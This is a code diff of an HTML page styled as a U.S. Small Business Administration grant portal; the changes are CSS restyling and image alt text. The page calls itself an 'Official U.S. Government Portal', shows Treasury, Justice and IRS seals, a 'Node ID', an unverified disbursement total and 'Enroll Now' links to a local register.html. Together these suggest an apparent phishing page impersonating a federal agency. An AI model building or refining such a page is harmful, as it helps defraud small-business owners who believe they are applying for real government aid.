@@ -7,36 +7,188 @@
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;600;700;900&display=swap');
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-navy: #001a3d; }
-        body { font-family: 'Public Sans', sans-serif; scroll-behavior: smooth; background-color: #ffffff; padding-bottom: 80px; }
         
+        :root { 
+            --sba-blue: #00274c; 
+            --sba-accent: #0071bc; 
+            --sba-gold: #b69121;
+            --sba-red: #cc0000;
+            --bg-light: #f1f5f9;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --success: #15803d;
+            --pending: #92400e;
+            --danger: #dc2626;
+            --white: #ffffff;
+        }
+
+        * { 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+            font-family: 'Public Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body { 
+            background: var(--bg-light); 
+            margin: 0; 
+            padding: 0;
+            color: var(--text-main);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+            padding-bottom: 90px;
+        }
+
+        /* --- OFFICIAL TOP BANNERS --- */
+        .gov-banner { 
+            background: #f1f1f1; 
+            color: #333; 
+            font-size: 10px; 
+            padding: 8px 15px; 
+            display: flex; 
+            align-items: center; 
+            font-weight: 700; 
+            border-bottom: 1px solid #ddd; 
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .ticker-wrap { 
+            background: var(--sba-blue); 
+            border-bottom: 4px solid var(--sba-red); 
+            overflow: hidden; 
+            white-space: nowrap; 
+        }
+        .ticker-content { 
+            display: inline-block; 
+            padding: 12px 0; 
+            font-size: 10px; 
+            font-weight: 900; 
+            color: white; 
+            animation: marquee 30s linear infinite; 
+        }
+        @keyframes marquee { 
+            0% { transform: translateX(100%); } 
+            100% { transform: translateX(-100%); } 
+        }
+
         /* Official Logo Box */
         .sba-logo-box { position: relative; display: inline-block; padding: 6px 10px; }
         .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 6px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
         .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }
 
-        /* Hero Image */
+        /* Hero Section */
         .hero-bg { 
             background: linear-gradient(rgba(0, 26, 61, 0.90), rgba(0, 26, 61, 0.98)), 
             url('https://images.unsplash.com/photo-1554224155-1696413565d3?q=80&w=2070&auto=format&fit=crop');
-            background-size: cover; background-position: center;
+            background-size: cover; 
+            background-position: center;
         }
 
-        /* Animated Ticker */
-        .ticker-wrap { background: var(--sba-blue); border-bottom: 4px solid var(--sba-red); overflow: hidden; white-space: nowrap; }
-        .ticker-content { display: inline-block; padding: 12px 0; font-size: 10px; font-weight: 900; color: white; animation: marquee 30s linear infinite; }
-        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-
-        /* Step Card */
-        .step-card { background: white; padding: 2rem; border-radius: 12px; border: 1px solid #e2e8f0; position: relative; overflow: hidden; height: 100%; transition: 0.3s; }
-        .step-number { font-size: 65px; font-weight: 900; color: #f1f5f9; position: absolute; top: -10px; right: 10px; z-index: 0; line-height: 1; }
+        /* Module Containers & Cards */
+        .card { 
+            background: var(--white); 
+            padding: 22px 18px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.06); 
+            border-top: 5px solid var(--sba-blue); 
+            margin-bottom: 15px;
+            animation: fadeIn 0.4s ease-out;
+        }
         
-        /* Mobile App Dock */
-        .bottom-dock { position: fixed; bottom: 0; left: 0; right: 0; background: white; height: 70px; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #e2e8f0; z-index: 1000; box-shadow: 0 -5px 20px rgba(0,0,0,0.05); }
-        .dock-item { display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 9px; font-weight: 900; color: #94a3b8; text-transform: uppercase; text-decoration: none; }
-        .dock-item.active { color: var(--sba-blue); }
+        .step-card { 
+            background: white; 
+            padding: 2rem; 
+            border-radius: 12px; 
+            border: 1px solid #e2e8f0; 
+            position: relative; 
+            overflow: hidden; 
+            height: 100%; 
+            transition: 0.3s; 
+        }
+        .step-number { 
+            font-size: 65px; 
+            font-weight: 900; 
+            color: #f1f5f9; 
+            position: absolute; 
+            top: -10px; 
+            right: 10px; 
+            z-index: 0; 
+            line-height: 1; 
+        }
+
+        /* --- GRID ACTION MENU --- */
+        .action-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .action-item {
+            background: var(--white);
+            padding: 20px 10px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid #e2e8f0;
+            text-decoration: none;
+            color: var(--sba-blue);
+            font-weight: 800;
+            font-size: 11px;
+            text-transform: uppercase;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .action-item span {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .action-item:active {
+            background: #f1f5f9;
+            transform: scale(0.96);
+        }
+
+        /* --- MOBILE APP DOCK --- */
+        .bottom-dock { 
+            position: fixed; 
+            bottom: 0; 
+            left: 0; 
+            right: 0; 
+            background: white; 
+            height: 75px; 
+            display: flex; 
+            justify-content: space-around; 
+            align-items: center; 
+            border-top: 1px solid #e2e8f0; 
+            z-index: 1000; 
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.05); 
+        }
+        .dock-item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            gap: 4px; 
+            font-size: 9px; 
+            font-weight: 900; 
+            color: #94a3b8; 
+            text-transform: uppercase; 
+            text-decoration: none; 
+        }
+        .dock-item.active { color: var(--sba-accent); }
+
+        /* --- UTILITIES --- */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body class="text-slate-900">
@@ -51,9 +203,9 @@
         });
     </script>
 
-    <div class="bg-[#efefef] text-[9px] py-2 px-5 flex items-center justify-between font-black text-slate-500 uppercase tracking-widest border-b">
+    <div class="gov-banner flex justify-between items-center px-6">
         <div class="flex items-center gap-2">
-            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="U.S. Flag">
             <span>Official U.S. Government Portal • Secure Site (HTTPS)</span>
         </div>
         <span class="hidden md:block">Node ID: SBA-V26-FINAL</span>
@@ -105,7 +257,7 @@
                 <div class="space-y-12">
                     <div>
                         <p class="text-[10px] uppercase text-slate-400 font-bold mb-3 tracking-widest">Total Disbursements</p>
-                        <h2 class="text-6xl font-black tracking-tighter">$14,842,910,200</h2>
+                        <h2 class="text-5xl font-black tracking-tighter">$14,842,910,200</h2>
                     </div>
                     <div class="grid grid-cols-2 gap-10 border-t border-white/10 pt-10">
                         <div>
@@ -172,19 +324,19 @@
                 <i class="fas fa-landmark text-4xl text-red-600 mb-8 block"></i>
                 <h4 class="font-black text-lg uppercase mb-4 tracking-tight">Business Support</h4>
                 <p class="text-sm text-slate-500 leading-relaxed mb-6">Financial assistance for small businesses to support growth and operations nationwide.</p>
-                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1 text-decoration-none">Enroll Now</a>
+                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1">Enroll Now</a>
             </div>
             <div class="bg-white p-10 border border-slate-200 border-t-8 border-t-[#002e6d] shadow-lg">
                 <i class="fas fa-shield-virus text-4xl text-red-600 mb-8 block"></i>
                 <h4 class="font-black text-lg uppercase mb-4 tracking-tight">Disaster Relief</h4>
                 <p class="text-sm text-slate-500 leading-relaxed mb-6">Direct support for businesses affected by federal emergencies or natural disasters.</p>
-                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1 text-decoration-none">Enroll Now</a>
+                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1">Enroll Now</a>
             </div>
             <div class="bg-white p-10 border border-slate-200 border-t-8 border-t-[#002e6d] shadow-lg">
                 <i class="fas fa-microchip text-4xl text-red-600 mb-8 block"></i>
                 <h4 class="font-black text-lg uppercase mb-4 tracking-tight">Innovation Fund</h4>
                 <p class="text-sm text-slate-500 leading-relaxed mb-6">Grants for technology, artificial intelligence, and startup development initiatives.</p>
-                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1 text-decoration-none">Enroll Now</a>
+                <a href="register.html" class="text-[10px] font-black uppercase text-[#002e6d] border-b-2 border-red-600 pb-1">Enroll Now</a>
             </div>
         </div>
     </section>
@@ -192,9 +344,9 @@
     <footer class="bg-white border-t border-gray-200 pt-20 pb-10 px-6">
         <div class="max-w-7xl mx-auto text-center">
             <div class="flex justify-center flex-wrap gap-10 mb-16 opacity-20 grayscale">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Seal_of_the_United_States_Department_of_the_Treasury.svg/1200px-Seal_of_the_United_States_Department_of_the_Treasury.svg.png" class="h-14">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Seal_of_the_United_States_Department_of_Justice.svg/1200px-Seal_of_the_United_States_Department_of_Justice.svg.png" class="h-14">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Seal_of_the_United_States_Internal_Revenue_Service.svg/1200px-Seal_of_the_United_States_Internal_Revenue_Service.svg.png" class="h-14">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Seal_of_the_United_States_Department_of_the_Treasury.svg/1200px-Seal_of_the_United_States_Department_of_the_Treasury.svg.png" class="h-14" alt="Treasury Seal">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Seal_of_the_United_States_Department_of_Justice.svg/1200px-Seal_of_the_United_States_Department_of_Justice.svg.png" class="h-14" alt="Justice Seal">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Seal_of_the_United_States_Internal_Revenue_Service.svg/1200px-Seal_of_the_United_States_Internal_Revenue_Service.svg.png" class="h-14" alt="IRS Seal">
             </div>
 
             <p class="text-[10px] text-slate-400 font-black uppercase tracking-[0.6em] mb-6">© 2026 U.S. Small Business Administration • V26-NODE</p>
